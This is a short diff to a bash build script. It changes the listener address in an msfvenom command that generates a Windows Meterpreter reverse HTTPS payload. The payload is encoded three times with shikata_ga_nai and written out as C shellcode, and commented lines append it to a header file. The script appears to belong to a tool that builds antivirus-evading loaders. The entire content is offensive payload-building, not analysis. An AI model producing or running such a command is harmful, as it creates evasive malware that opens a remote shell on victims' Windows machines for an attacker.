@@ -1,6 +1,6 @@
 #!/bin/bash          
 . build/global_win32.sh
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
 #./format.sh sc.txt > scclean.txt && rm sc.txt
 #cat sc.txt >> defs.h
 #echo "" > scclean.txt
